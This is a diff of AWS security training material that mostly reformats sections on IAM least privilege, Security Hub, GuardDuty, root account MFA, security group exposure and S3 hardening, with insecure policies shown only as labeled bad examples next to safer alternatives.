 Each function receives only the permissions it requires.
 
 ### Example: File Processing Lambda
@@ -17077,6 +17342,7 @@ Permissions:
   ],
   "Resource": "arn:aws:s3:::uploads/*"
 }
+
 ```
 
 ```json
@@ -17086,6 +17352,7 @@ Permissions:
   ],
   "Resource": "arn:aws:dynamodb:region:account:table/results"
 }
+
 ```
 
 ```json
@@ -17096,6 +17363,7 @@ Permissions:
   ],
   "Resource": "*"
 }
+
 ```
 
 No additional permissions are necessary.
@@ -17103,10 +17371,12 @@ No additional permissions are necessary.
 ### Common Lambda Permission Mistakes
 
 **Wildcard Actions:** Bad:
+
 ```json
 {
   "Action": "s3:*"
 }
+
 ```
 
 Better:
@@ -17117,13 +17387,16 @@ Better:
     "s3:GetObject"
   ]
 }
+
 ```
 
 **Wildcard Resources:** Bad:
+
 ```json
 {
   "Resource": "*"
 }
+
 ```
 
 Better:
@@ -17132,16 +17405,19 @@ Better:
 {
   "Resource": "arn:aws:s3:::specific-bucket/*"
 }
+
 ```
 
 **Combining Multiple Workloads:** Bad:
 
-- One role
-- ├── S3 Access
-- ├── DynamoDB Access
-- ├── SNS Access
-- ├── IAM Access
-- └── EC2 Access
+```text
+One role
+├── S3 Access
+├── DynamoDB Access
+├── SNS Access
+├── IAM Access
+└── EC2 Access
+```
 
 This dramatically increases attack surface.
 
@@ -17205,12 +17481,14 @@ Resource-level access control in IAM policies achieves this by specifying exact 
 ### Why Resource-Level Permissions Matter
 
 **Overly Broad Access**
+
 ```json
 {
 "Effect": "Allow",
 "Action": "s3:GetObject",
 "Resource": "*"
 }
+
 ```
 Result:
 
@@ -17220,12 +17498,14 @@ Result:
 If credentials are compromised, an attacker may gain access to all stored data.
 
 **Scoped Access**
+
 ```json
 {
 "Effect": "Allow",
 "Action": "s3:GetObject",
 "Resource": "arn:aws:s3:::reports/2025/*"
 }
+
 ```
 Result:
 
@@ -17275,6 +17555,7 @@ Use:
   "Action": "s3:ListBucket",
   "Resource": "arn:aws:s3:::training-data"
 }
+
 ```
 
 **Object-Level Actions:** Examples:
@@ -17289,6 +17570,7 @@ Use:
   "Action": "s3:GetObject",
   "Resource": "arn:aws:s3:::training-data/*"
 }
+
 ```
 
 ### Common IAM Pattern
@@ -17305,6 +17587,7 @@ Read-only access to a bucket:
     "arn:aws:s3:::training-data"
   ]
 }
+
 ```
 
 ```json
@@ -17317,6 +17600,7 @@ Read-only access to a bucket:
     "arn:aws:s3:::training-data/*"
   ]
 }
+
 ```
 
 Notice that both bucket and object ARNs are required.
@@ -17325,12 +17609,14 @@ Notice that both bucket and object ARNs are required.
 
 Example bucket structure:
 
-- training-data
-- │
-- ├── reports/
-- ├── finance/
-- ├── backups/
-- └── logs/
+```text
+training-data
+│
+├── reports/
+├── finance/
+├── backups/
+└── logs/
+```
 
 Provide access only to reports:
 
@@ -17344,6 +17630,7 @@ Provide access only to reports:
     "arn:aws:s3:::training-data/reports/*"
   ]
 }
+
 ```
 
 Result:
@@ -17358,11 +17645,13 @@ Result:
 ### Dangerous Wildcards
 
 **Example 1**
+
 ```json
 {
 "Action": "s3:*",
 "Resource": "*"
 }
+
 ```
 Allows:
 
@@ -17375,11 +17664,13 @@ Allows:
 This effectively grants administrative control over S3.
 
 **Example 2**
+
 ```json
 {
 "Action": "s3:GetObject",
 "Resource": "*"
 }
+
 ```
 Allows reading from every bucket in the account.
 
@@ -17423,6 +17714,7 @@ Policy:
     "arn:aws:s3:::invoice-bucket/*"
   ]
 }
+
 ```
 
 Not required:
@@ -17488,12 +17780,14 @@ Even a small permission mistake can create a large blast radius.
 ### 1. Wildcard Permissions
 
 **High Risk Example**
+
 ```json
 {
 "Effect": "Allow",
 "Action": "*",
 "Resource": "*"
 }
+
 ```
 This effectively grants administrator-level access.
 
@@ -17565,6 +17859,7 @@ Example:
     "AWS": "arn:aws:iam::123456789012:root"
   }
 }
+
 ```
 
 **Risk**
@@ -17578,13 +17873,16 @@ Review trust policies regularly.
 Common examples:
 
 **Lambda Roles**
+
 ```json
 {
 "Action": "*",
 "Resource": "*"
 }
+
 ```
 **EC2 Instance Profiles**
+
 ```json
 {
 "Action": [
@@ -17593,6 +17891,7 @@ Common examples:
 ],
 "Resource": "*"
 }
+
 ```
 **ECS Task Roles:** Excessive permissions can expose:
 * S3 buckets
@@ -17623,9 +17922,11 @@ Administrative accounts should require:
 
 Without MFA:
 
-- Password Leak
-- ↓
-- Direct Console Access
+```text
+Password Leak
+↓
+Direct Console Access
+```
 
 With MFA:
 
@@ -17639,6 +17940,7 @@ Dangerous example:
 {
   "Principal": "*"
 }
+
 ```
 
 This allows anyone to potentially assume the role.
@@ -17664,24 +17966,28 @@ List users:
 
 ```bash
 aws iam list-users
+
 ```
 
 List roles:
 
 ```bash
 aws iam list-roles
+
 ```
 
 List attached policies:
 
 ```bash
 aws iam list-attached-user-policies --user-name analyst
+
 ```
 
 Review trust policies:
 
 ```bash
 aws iam get-role --role-name SecurityRole
+
 ```
 
 ### IAM Access Analyzer
@@ -17845,6 +18151,7 @@ Example:
 
 ```bash
 aws iam scan-permissions
+
 ```
 
 Looks legitimate but does not exist.
@@ -17863,6 +18170,7 @@ Example:
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 Functionally correct.
@@ -17915,6 +18223,7 @@ Before approval, verify:
 ## Example: AI-Assisted IAM Policy Review
 
 **AI Suggestion**
+
 ```json
 {
 "Effect": "Allow",
@@ -17925,6 +18234,7 @@ Before approval, verify:
 ],
 "Resource": "*"
 }
+
 ```
 **Human Review:** Observation:
 
@@ -17941,6 +18251,7 @@ Correction:
   ],
   "Resource": "arn:aws:s3:::security-reports/*"
 }
+
 ```
 
 Human validation reduced risk and enforced least privilege.
@@ -17987,8 +18298,10 @@ AI models are trained on historical data and may not know about:
 * Emerging attack techniques
 
 **Example:** A model may recommend:
+
 ```bash
 sudo apt install package-name
+
 ```
 
 even though:
@@ -18005,14 +18318,18 @@ Hallucinations occur when AI generates information that sounds plausible but is 
 
 Examples:
 **Invented Commands**
+
 ```bash
 aws iam scan-permissions
+
 ```
 Looks legitimate but does not exist.
 
 **Invented APIs**
+
 ```python
 security_client.detect_threat()
+
 ```
 May appear reasonable but is not part of the SDK.
 
@@ -18040,17 +18357,20 @@ Testing is always required.
 AI often prioritizes functionality over security.
 
 **Example:** AI-generated IAM policy:
+
 ```json
 {
   "Effect": "Allow",
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 This policy solves access issues but violates least privilege.
 
 **Safer Alternative**
+
 ```json
 {
 "Effect": "Allow",
@@ -18061,6 +18381,7 @@ This policy solves access issues but violates least privilege.
 "arn:aws:s3:::reports/*"
 ]
 }
+
 ```
 Human review is necessary to enforce security requirements.
 
@@ -18266,13 +18587,9 @@ Not all findings are equally important.
 Example:
 
 | Finding                                   | Risk     |
-
 | ----------------------------------------- | -------- |
-
 | Public S3 bucket containing customer data | Critical |
-
 | Unused IAM role                           | Medium   |
-
 | Missing resource tag                      | Low      |
 
 Security teams should focus first on findings with the greatest business impact.
@@ -18307,6 +18624,7 @@ Example:
   "Principal": "*",
   "Action": "s3:GetObject"
 }
+
 ```
 
 Risk:
@@ -18324,6 +18642,7 @@ Example:
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 Risk:
@@ -18568,6 +18887,7 @@ Example:
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 Risk:
@@ -18615,17 +18935,11 @@ Risk:
 ## CSPM vs Vulnerability Management
 
 | CSPM                             | Vulnerability Scanner                      |
-
 | -------------------------------- | ------------------------------------------ |
-
 | Evaluates cloud configurations   | Evaluates software vulnerabilities         |
-
 | Uses cloud APIs                  | Uses network scanning                      |
-
 | Finds misconfigurations          | Finds CVEs                                 |
-
 | Reviews IAM, S3, Security Groups | Reviews operating systems and applications |
-
 | Continuous posture assessment    | Vulnerability assessment                   |
 
 Both are important and complementary.
@@ -18682,44 +18996,39 @@ AWS provides a comprehensive set of native security services that help organizat
 Different security problems require different solutions.
 
 | Security Need            | AWS Service         |
-
 | ------------------------ | ------------------- |
-
 | Threat Detection         | GuardDuty           |
-
 | Configuration Monitoring | AWS Config          |
-
 | Vulnerability Assessment | Inspector           |
-
 | Audit Logging            | CloudTrail          |
-
 | Access Analysis          | IAM Access Analyzer |
-
 | Centralized Findings     | Security Hub        |
 
 Together these services create a layered security architecture.
 
 ## AWS Security Architecture
 
-- AWS Resources
-- │
-- ▼
-- CloudTrail Logs
-- │
-- ▼
-- GuardDuty Threat Detection
-- │
-- ▼
-- Security Hub
-- ▲
-- │
-- AWS Config Findings
-- ▲
-- │
-- Inspector Vulnerabilities
-- ▲
-- │
-- IAM Access Analyzer Findings
+```text
+AWS Resources
+│
+▼
+CloudTrail Logs
+│
+▼
+GuardDuty Threat Detection
+│
+▼
+Security Hub
+▲
+│
+AWS Config Findings
+▲
+│
+Inspector Vulnerabilities
+▲
+│
+IAM Access Analyzer Findings
+```
 
 Security Hub acts as the central dashboard that aggregates findings from multiple services.
 
@@ -18813,6 +19122,7 @@ Think of it as the security audit log for AWS.
   "userIdentity": "admin-user",
   "sourceIPAddress": "10.1.5.20"
 }
+
 ```
 
 ### Questions CloudTrail Can Answer
@@ -18913,19 +19223,12 @@ Security analysts can investigate everything from a single dashboard.
 ## Service Comparison
 
 | Service             | Primary Focus                  |
-
 | ------------------- | ------------------------------ |
-
 | Security Hub        | Centralized security dashboard |
-
 | GuardDuty           | Threat detection               |
-
 | IAM Access Analyzer | Access exposure analysis       |
-
 | CloudTrail          | Audit logging                  |
-
 | AWS Config          | Configuration monitoring       |
-
 | Inspector           | Vulnerability management       |
 
 ## Typical SOC Workflow
@@ -19000,56 +19303,46 @@ Security Hub automatically evaluates resources.
 Examples:
 
 | Resource       | Check                    |
-
 | -------------- | ------------------------ |
-
 | IAM User       | MFA Enabled              |
-
 | S3 Bucket      | Public Access Blocked    |
-
 | EBS Volume     | Encryption Enabled       |
-
 | CloudTrail     | Logging Enabled          |
-
 | Security Group | No Open Management Ports |
 
 ## Security Hub Architecture
 
-- AWS Resources
-- │
-- ▼
-- Security Controls
-- │
-- ▼
-- AWS Services
-- (GuardDuty, Inspector,
-- Config, Access Analyzer)
-- │
-- ▼
-- Security Hub
-- │
-- ▼
-- Findings Dashboard
-- │
-- ▼
-- Security Team
+```text
+AWS Resources
+│
+▼
+Security Controls
+│
+▼
+AWS Services
+(GuardDuty, Inspector,
+Config, Access Analyzer)
+│
+▼
+Security Hub
+│
+▼
+Findings Dashboard
+│
+▼
+Security Team
+```
 
 ## Finding Severity Levels
 
 Security Hub categorizes findings by severity.
 
 | Severity      | Meaning                   |
-
 | ------------- | ------------------------- |
-
 | Informational | Awareness only            |
-
 | Low           | Minor issue               |
-
 | Medium        | Requires review           |
-
 | High          | Significant security risk |
-
 | Critical      | Immediate action required |
 
 ### Example Findings
@@ -19109,19 +19402,12 @@ Security teams can immediately identify gaps requiring remediation.
 ## Integration with Other AWS Security Services
 
 | Service          | Contribution              |
-
 | ---------------- | ------------------------- |
-
 | GuardDuty        | Threat detection findings |
-
 | Inspector        | Vulnerability findings    |
-
 | AWS Config       | Configuration compliance  |
-
 | Access Analyzer  | External access findings  |
-
 | Firewall Manager | Network security findings |
-
 | CloudTrail       | Investigation evidence    |
 
 Security Hub becomes the central investigation portal.
@@ -19187,46 +19473,35 @@ Example checks:
 Every finding receives a severity level to help prioritize investigations.
 
 | Severity      | Description                            |
-
 | ------------- | -------------------------------------- |
-
 | Critical      | Immediate risk requiring urgent action |
-
 | High          | Significant security exposure          |
-
 | Medium        | Important issue requiring review       |
-
 | Low           | Minor security concern                 |
-
 | Informational | Observation with minimal risk          |
 
 ### Example Severity Mapping
 
 **Critical**
-```text id="m87frt"
-Administrator IAM User
-Without MFA
-```
+
+- Administrator IAM User
+- Without MFA
 **High**
-```text id="1zsjtp"
-Public S3 Bucket
-Containing Sensitive Data
-```
+
+- Public S3 Bucket
+- Containing Sensitive Data
 **Medium**
-```text id="4aqw73"
-Security Group
-Allows SSH From Internet
-```
+
+- Security Group
+- Allows SSH From Internet
 **Low**
-```text id="xj1wvh"
-Unused Access Key
-```
+ `Unused Access Key`
 
 ## Automatic Finding Aggregation
 
 Security Hub automatically collects findings from multiple AWS services.
 
-```text id="11j5ck"
+```text
 GuardDuty
     │
 Inspector
@@ -19251,11 +19526,9 @@ Provides:
 
 Example:
 
-```text id="3j2c3l"
-EC2 Instance
-Communicating With
-Known Command & Control Server
-```
+- EC2 Instance
+- Communicating With
+- Known Command & Control Server
 
 ### Amazon Inspector
 
@@ -19268,10 +19541,8 @@ Provides:
 
 Example:
 
-```text id="k78zcw"
-Critical OpenSSL CVE
-Detected On EC2 Instance
-```
+- Critical OpenSSL CVE
+- Detected On EC2 Instance
 
 ### Amazon Macie
 
@@ -19283,10 +19554,8 @@ Provides:
 
 Example:
 
-```text id="h9qkki"
-Credit Card Data
-Found In S3 Bucket
-```
+- Credit Card Data
+- Found In S3 Bucket
 
 ### IAM Access Analyzer
 
@@ -19298,30 +19567,24 @@ Provides:
 
 Example:
 
-```text id="jjc2jv"
-Role Accessible
-By External AWS Account
-```
+- Role Accessible
+- By External AWS Account
 
 ## Security Score
 
 One of the most useful Security Hub metrics is the Security Score.
 
 **Formula**
-```text id="2uvjbm"
-Passing Controls
--------------------- × 100
-Total Controls
-```
+
+- Passing Controls
+- -------------------- × 100
+- Total Controls
 **Example**
-```text id="0vz7lh"
-Controls Evaluated: 300
-Passed: 270
 
-Failed: 30
-
-Security Score = 90%
-```
+- Controls Evaluated: 300
+- Passed: 270
+- Failed: 30
+- Security Score = 90%
 
 ### Why Security Score Matters
 
@@ -19334,15 +19597,10 @@ Provides:
 
 ### Example Trend
 
-```text id="hjw9a5"
-January   82%
-
-February  86%
-
-March     89%
-
-April     93%
-```
+- January   82%
+- February  86%
+- March     89%
+- April     93%
 
 Security posture is improving over time.
 
@@ -19360,7 +19618,7 @@ It does **not**:
 
 Instead it generates findings requiring action.
 
-```text id="3u8cwy"
+```text
 Detect
     ↓
 Report
@@ -19377,7 +19635,8 @@ Human Remediation
 **Step 3:** Security team reviews high-severity issues.
 **Step 4:** Engineers remediate problems.
 **Step 5:** Controls pass during next evaluation.
-```text id="7jw09z"
+
+```text
 Finding
    ↓
 Security Hub
@@ -19429,22 +19688,24 @@ Amazon GuardDuty is AWS's fully managed threat detection service. It continuousl
 
 GuardDuty analyzes multiple AWS telemetry sources:
 
-- CloudTrail Logs
-- │
-- ▼
-- VPC Flow Logs
-- │
-- ▼
-- DNS Query Logs
-- │
-- ▼
-- S3 Data Events
-- │
-- ▼
-- EKS Audit Logs
-- │
-- ▼
-- GuardDuty Detection Engine
+```text
+CloudTrail Logs
+│
+▼
+VPC Flow Logs
+│
+▼
+DNS Query Logs
+│
+▼
+S3 Data Events
+│
+▼
+EKS Audit Logs
+│
+▼
+GuardDuty Detection Engine
+```
 
 These sources provide visibility across users, APIs, network traffic, storage access, and Kubernetes environments.
 
@@ -19460,20 +19721,22 @@ GuardDuty combines:
 
 to identify activities that differ from normal behavior.
 
-- AWS Activity
-- │
-- ▼
-- Log Collection
-- │
-- ▼
-- Threat Intelligence
-- +
-- Behavior Analytics
-- +
-- Machine Learning
-- │
-- ▼
-- GuardDuty Findings
+```text
+AWS Activity
+│
+▼
+Log Collection
+│
+▼
+Threat Intelligence
++
+Behavior Analytics
++
+Machine Learning
+│
+▼
+GuardDuty Findings
+```
 
 ## Reconnaissance Detection
 
@@ -19482,12 +19745,16 @@ Reconnaissance activities often occur before an attack.
 GuardDuty can detect:
 
 **Port Scanning**
-- EC2 Instance
-- │
-- Scanning Hundreds of IPs
-- │
-- ▼
-- Recon:EC2/Portscan
+
+```text
+EC2 Instance
+│
+Scanning Hundreds of IPs
+│
+▼
+Recon:EC2/Portscan
+```
+
 **API Enumeration:** Attackers attempting to discover AWS resources:
 
 - ListBuckets
@@ -19549,13 +19816,15 @@ Compromised cloud resources are often used for crypto mining.
 
 GuardDuty detects:
 
-- EC2 Instance
-- │
-- Communication
-- │
-- Known Mining Pool
-- ▼
-- CryptoCurrency:EC2
+```text
+EC2 Instance
+│
+Communication
+│
+Known Mining Pool
+▼
+CryptoCurrency:EC2
+```
 
 ### Indicators
 
@@ -19574,17 +19843,25 @@ Examples include:
 especially when root usage is unexpected.
 
 **Public S3 Exposure**
-- Sensitive Bucket
-- │
-- Public Access Enabled
+
+```text
+Sensitive Bucket
+│
+Public Access Enabled
+```
+
 potentially exposing confidential data.
 
 **Privilege Escalation**
-- User
-- │
-- Creates New Policy
-- │
-- Grants Administrator Rights
+
+```text
+User
+│
+Creates New Policy
+│
+Grants Administrator Rights
+```
+
 GuardDuty flags suspicious privilege changes.
 
 ## Example GuardDuty Finding
@@ -19604,6 +19881,7 @@ GuardDuty flags suspicious privilege changes.
   "Instance is performing
   network reconnaissance."
 }
+
 ```
 
 ## Finding Severity Levels
@@ -19611,15 +19889,10 @@ GuardDuty flags suspicious privilege changes.
 GuardDuty findings are categorized by severity.
 
 | Severity  | Meaning                                                      |
-
 | --------- | ------------------------------------------------------------ |
-
 | Low       | Suspicious activity requiring awareness                      |
-
 | Medium    | Potential compromise requiring investigation                 |
-
 | High      | Strong indicator of malicious activity                       |
-
 | Critical* | Some integrated findings may appear critical in Security Hub |
 
 ### Examples
@@ -19630,37 +19903,33 @@ GuardDuty findings are categorized by severity.
 
 ## GuardDuty Investigation Workflow
 
-- Activity Detected
-- │
-- ▼
-- GuardDuty Finding
-- │
-- ▼
-- Security Hub
-- │
-- ▼
-- Security Analyst
-- │
-- ▼
-- Investigation
-- │
-- ▼
-- Containment
+```text
+Activity Detected
+│
+▼
+GuardDuty Finding
+│
+▼
+Security Hub
+│
+▼
+Security Analyst
+│
+▼
+Investigation
+│
+▼
+Containment
+```
 
 ## GuardDuty vs Traditional IDS
 
 | Traditional IDS           | GuardDuty                 |
-
 | ------------------------- | ------------------------- |
-
 | Requires sensors          | Agentless                 |
-
 | Infrastructure management | Fully managed             |
-
 | Signature-based only      | ML + behavioral analytics |
-
 | Local visibility          | AWS-wide visibility       |
-
 | Manual updates            | AWS-managed updates       |
 
 ## Common GuardDuty Findings
@@ -19703,37 +19972,44 @@ Characteristics:
 * Can modify billing settings
 * Can close the AWS account
 * Can change account ownership information
-- AWS Account
-- │
-- ▼
-- Root User
-- │
-- ├── Billing
-- ├── IAM
-- ├── S3
-- ├── EC2
-- ├── RDS
-- ├── Lambda
-- ├── Organizations
-- └── Account Closure
+
+```text
+AWS Account
+│
+▼
+Root User
+│
+├── Billing
+├── IAM
+├── S3
+├── EC2
+├── RDS
+├── Lambda
+├── Organizations
+└── Account Closure
+```
 
 ## Why Root Account Security Matters
 
 If an attacker compromises a normal IAM user:
 
-- Compromised IAM User
-- │
-- Limited Permissions
-- ▼
-- Limited Damage
+```text
+Compromised IAM User
+│
+Limited Permissions
+▼
+Limited Damage
+```
 
 If an attacker compromises the root account:
 
-- Compromised Root User
-- │
-- Full Administrative Control
-- ▼
-- Complete Account Takeover
+```text
+Compromised Root User
+│
+Full Administrative Control
+▼
+Complete Account Takeover
+```
 
 Potential consequences include:
 
@@ -19763,16 +20039,18 @@ AWS strongly recommends MFA for all privileged accounts and requires it for root
 
 ## How MFA Works
 
-- Username + Password
-- │
-- ▼
-- Identity Verified
-- │
-- ▼
-- Enter MFA Code
-- │
-- ▼
-- Access Granted
+```text
+Username + Password
+│
+▼
+Identity Verified
+│
+▼
+Enter MFA Code
+│
+▼
+Access Granted
+```
 
 Even if an attacker steals the password, they still need the MFA device.
 
@@ -19815,10 +20093,12 @@ Hardware keys are preferred whenever possible.
 
 ### Enable MFA Immediately
 
-- Root Account
-- │
-- ▼
-- MFA Enabled
+```text
+Root Account
+│
+▼
+MFA Enabled
+```
 
 This should be one of the first actions performed after creating an AWS account.
 
@@ -19826,11 +20106,13 @@ This should be one of the first actions performed after creating an AWS account.
 
 Bad Practice:
 
-- Root User
-- │
-- Access Key
-- ▼
-- Programmatic Full Access
+```text
+Root User
+│
+Access Key
+▼
+Programmatic Full Access
+```
 
 Root access keys:
 
@@ -19854,13 +20136,15 @@ Do not use the root account for:
 
 Instead:
 
-- Root Account
-- │
-- Creates
-- ▼
-- Administrator IAM User
-- │
-- Daily Operations
+```text
+Root Account
+│
+Creates
+▼
+Administrator IAM User
+│
+Daily Operations
+```
 
 ## Tasks That Require Root Access
 
@@ -19884,10 +20168,12 @@ Examples include:
 - +
 - Hardware Key
 **Remove Existing Root Access Keys:** Check:
+
 ```bash
 AWS Console
 → IAM
 → Credential Report
+
 ```
 
 Verify:
@@ -19918,6 +20204,7 @@ Example event:
   },
   "eventName": "DeleteBucket"
 }
+
 ```
 
 Any unexpected root activity should trigger investigation.
@@ -20027,12 +20314,14 @@ Generate report:
 
 ```bash
 aws iam generate-credential-report
+
 ```
 
 Retrieve report:
 
 ```bash
 aws iam get-credential-report
+
 ```
 
 The report includes:
@@ -20046,21 +20335,13 @@ The report includes:
 ## Example Credential Report Fields
 
 | Field                       | Purpose               |
-
 | --------------------------- | --------------------- |
-
 | user                        | IAM username          |
-
 | password_enabled            | Console access exists |
-
 | mfa_active                  | MFA enabled status    |
-
 | access_key_1_active         | Access key enabled    |
-
 | access_key_1_last_used_date | Last usage            |
-
 | password_last_used          | Last login            |
-
 | access_key_1_last_rotated   | Key age               |
 
 Security teams review these reports regularly.
@@ -20124,9 +20405,11 @@ All users with console access should have MFA enabled.
 
 Without MFA:
 
-- Password Theft
-- ↓
-- Account Compromise
+```text
+Password Theft
+↓
+Account Compromise
+```
 
 With MFA:
 
@@ -20152,9 +20435,11 @@ Avoid long-term access keys whenever possible.
 
 Instead of:
 
-- Application
-- ↓
-- Stored Access Key
+```text
+Application
+↓
+Stored Access Key
+```
 
 Use:
 
@@ -20194,6 +20479,7 @@ Bad example:
 ```python
 AWS_ACCESS_KEY_ID="AKIA..."
 AWS_SECRET_ACCESS_KEY="..."
+
 ```
 
 Never hardcode credentials.
@@ -20202,9 +20488,11 @@ Never hardcode credentials.
 
 Use:
 
-- IAM Role
-- ↓
-- STS Temporary Credentials
+```text
+IAM Role
+↓
+STS Temporary Credentials
+```
 
 Examples:
 * EC2 Instance Roles
@@ -20325,21 +20613,13 @@ This significantly reduces attack surface.
 ## Commonly Exposed Ports
 
 | Port  | Service       | Risk                |
-
 | ----- | ------------- | ------------------- |
-
 | 22    | SSH           | Brute force attacks |
-
 | 3389  | RDP           | Credential attacks  |
-
 | 3306  | MySQL         | Database exposure   |
-
 | 5432  | PostgreSQL    | Database exposure   |
-
 | 6379  | Redis         | Data theft          |
-
 | 9200  | Elasticsearch | Data leakage        |
-
 | 27017 | MongoDB       | Unauthorized access |
 
 These ports should rarely be open to the internet.
@@ -20420,9 +20700,11 @@ Examples:
 
 Security Groups:
 
-- 443 → Internet
-- 8080 → Web Tier Only
-- 3306 → App Tier Only
+```text
+443 → Internet
+8080 → Web Tier Only
+3306 → App Tier Only
+```
 
 No direct internet access to backend systems.
 
@@ -20515,17 +20797,11 @@ Many major ransomware incidents begin with exposed RDP.
 Common Database Ports:
 
 | Service    | Port  |
-
 | ---------- | ----- |
-
 | MySQL      | 3306  |
-
 | PostgreSQL | 5432  |
-
 | MongoDB    | 27017 |
-
 | Redis      | 6379  |
-
 | SQL Server | 1433  |
 
 Dangerous Example:
@@ -20546,26 +20822,22 @@ Correct Architecture:
 
 Never:
 
-- Internet
-- ↓
-- Database
+```text
+Internet
+↓
+Database
+```
 
 ## High-Risk Misconfiguration #4: Public Administrative Interfaces
 
 Examples:
 
 | Port | Service           |
-
 | ---- | ----------------- |
-
 | 8080 | Admin Consoles    |
-
 | 8443 | Secure Admin Port |
-
 | 9000 | Management Tools  |
-
 | 5601 | Kibana            |
-
 | 9200 | Elasticsearch     |
 
 Attackers frequently search for:
@@ -20606,19 +20878,12 @@ This is easier to manage and more secure.
 ## Security Group Risk Matrix
 
 | Configuration                   | Risk Level         |
-
 | ------------------------------- | ------------------ |
-
 | SSH (22) → 0.0.0.0/0            | High               |
-
 | RDP (3389) → 0.0.0.0/0          | Critical           |
-
 | Database → 0.0.0.0/0            | Critical           |
-
 | Admin Panel → 0.0.0.0/0         | Critical           |
-
 | HTTPS (443) → 0.0.0.0/0         | Usually Acceptable |
-
 | Internal Service → SG Reference | Low                |
 
 ## Detecting These Misconfigurations
@@ -20668,7 +20933,7 @@ Because S3 is designed for scalable data sharing, security controls must be care
 
 A single misconfigured bucket can expose millions of records.
 
-```text id="s3risk1"
+```text
 Sensitive Data
       ↓
 Misconfigured Bucket
@@ -20691,14 +20956,12 @@ Examples of exposed data:
 
 Every bucket should be reviewed for:
 
-```text id="s3controls"
-Block Public Access
-Bucket Policy
-ACL Settings
-Encryption
-Logging
-Versioning
-```
+- Block Public Access
+- Bucket Policy
+- ACL Settings
+- Encryption
+- Logging
+- Versioning
 
 These controls form the foundation of S3 security.
 
@@ -20706,19 +20969,17 @@ These controls form the foundation of S3 security.
 
 AWS provides four account-level and bucket-level controls collectively known as:
 
-```text id="s3bpa"
-Block Public Access (BPA)
-```
+ `Block Public Access (BPA)`
 
 Purpose:
 
-```text id="s3flow1"
+```text
 Public ACL
      ↓
 Blocked
 ```
 
-```text id="s3flow2"
+```text
 Public Bucket Policy
      ↓
 Blocked
@@ -20726,32 +20987,23 @@ Blocked
 
 Best Practice:
 
-```text id="s3best1"
-Enable BPA
-On Every Bucket
-```
+- Enable BPA
+- On Every Bucket
 
 unless public access is explicitly required.
 
 ## The Four Block Public Access Settings
 
 | Setting                 | Purpose                                   |
-
 | ----------------------- | ----------------------------------------- |
-
 | Block Public ACLs       | Prevent new public ACLs                   |
-
 | Ignore Public ACLs      | Ignore existing public ACLs               |
-
 | Block Public Policies   | Prevent public bucket policies            |
-
 | Restrict Public Buckets | Limit public access even if policy exists |
 
 Recommended:
 
-```text id="s3secure"
-All Four Settings Enabled
-```
+ `All Four Settings Enabled`
 
 ## Control #2: Review Bucket Policies
 
@@ -20765,11 +21017,12 @@ Example of a dangerous policy:
   "Action": "s3:GetObject",
   "Resource": "arn:aws:s3:::company-data/*"
 }
+
 ```
 
 Meaning:
 
-```text id="s3public"
+```text
 Anyone
    ↓
 Can Read Objects
@@ -20785,19 +21038,19 @@ Safe Example:
 "Principal": {
   "AWS": "arn:aws:iam::123456789012:role/AppRole"
 }
+
 ```
 
 Dangerous Example:
 
 ```json
 "Principal": "*"
+
 ```
 
 Review every policy for:
 
-```text id="principalcheck"
-Principal = *
-```
+ `Principal = *`
 
 which is a common indicator of public exposure.
 
@@ -20807,7 +21060,7 @@ Access Control Lists (ACLs) are a legacy permission mechanism.
 
 Modern AWS recommendation:
 
-```text id="aclmodern"
+```text
 Bucket Owner Enforced
         ↓
 ACLs Disabled
@@ -20823,7 +21076,7 @@ Benefits:
 
 Dangerous ACL:
 
-```text id="aclbad"
+```text
 AllUsers
    ↓
 Read Access
@@ -20831,7 +21084,7 @@ Read Access
 
 Result:
 
-```text id="aclflow"
+```text
 Internet Users
       ↓
 Bucket Objects
@@ -20846,13 +21099,9 @@ Data stored in S3 should always be encrypted.
 Options:
 
 **SSE-S3**
-```text id="sses3"
-AWS Managed Keys
-```
+ `AWS Managed Keys`
 **SSE-KMS**
-```text id="ssekms"
-AWS KMS Keys
-```
+ `AWS KMS Keys`
 Provides:
 
 * Auditability
@@ -20863,7 +21112,7 @@ Recommended for sensitive data.
 
 ## Encryption Flow
 
-```text id="encryptflow"
+```text
 Object Upload
       ↓
 Encryption
@@ -20875,7 +21124,7 @@ Encrypted At Rest
 
 Without encryption:
 
-```text id="noencrypt"
+```text
 Stored Data
       ↓
 Plaintext Risk
@@ -20886,13 +21135,15 @@ Plaintext Risk
 Enable:
 
 **Versioning**
-```text id="versioning"
+
+```text
 File V1
 ↓
 File V2
 ↓
 File V3
 ```
+
 Protects against:
 
 * Accidental deletion
@@ -20900,37 +21151,29 @@ Protects against:
 * User mistakes
 
 **Access Logging**
-```text id="logging"
+
+```text
 User Access
 ↓
 S3 Logs
 ↓
 Audit Trail
 ```
+
 Provides visibility into object access activity.
 
 ## Common S3 Misconfigurations
 
 **Critical**
-```text id="s3mis1"
-Block Public Access Disabled
-```
+ `Block Public Access Disabled`
 **Critical**
-```text id="s3mis2"
-Principal = *
-```
+ `Principal = *`
 **High**
-```text id="s3mis3"
-Public Read ACL
-```
+ `Public Read ACL`
 **High**
-```text id="s3mis4"
-No Encryption Enabled
-```
+ `No Encryption Enabled`
 **Medium**
-```text id="s3mis5"
-Versioning Disabled
-```
+ `Versioning Disabled`
 
 ## AWS Security Hub Monitoring
 
@@ -20938,7 +21181,7 @@ Security Hub automatically evaluates S3 controls.
 
 Example:
 
-```text id="securityhub"
+```text
 Security Hub
       ↓
 S3 Control Checks
@@ -20949,22 +21192,16 @@ Compliance Findings
 Common controls:
 
 | Control | Purpose                     |
-
 | ------- | --------------------------- |
-
 | S3.1    | Block Public Access enabled |
-
 | S3.2    | Bucket policies not public  |
-
 | S3.3    | Buckets encrypted           |
-
 | S3.8    | Versioning enabled          |
-
 | S3.9    | Access logging enabled      |
 
 ## Example Secure Bucket Architecture
 
-```text id="s3securearch"
+```text
 Users
   ↓
 IAM Role
@@ -20976,29 +21213,25 @@ Encrypted S3 Bucket
 
 Additional protections:
 
-```text id="extras3"
-Block Public Access
-Versioning
-Logging
-Encryption
-```
+- Block Public Access
+- Versioning
+- Logging
+- Encryption
 
 All enabled.
 
 ## S3 Security Review Checklist
 
-```text id="s3checklist"
-✓ Block Public Access Enabled
-✓ No Public Bucket Policies
-✓ ACLs Disabled
-✓ Encryption Enabled
-✓ Versioning Enabled
-✓ Logging Enabled
-✓ Least Privilege IAM Access
-✓ Security Hub Monitoring
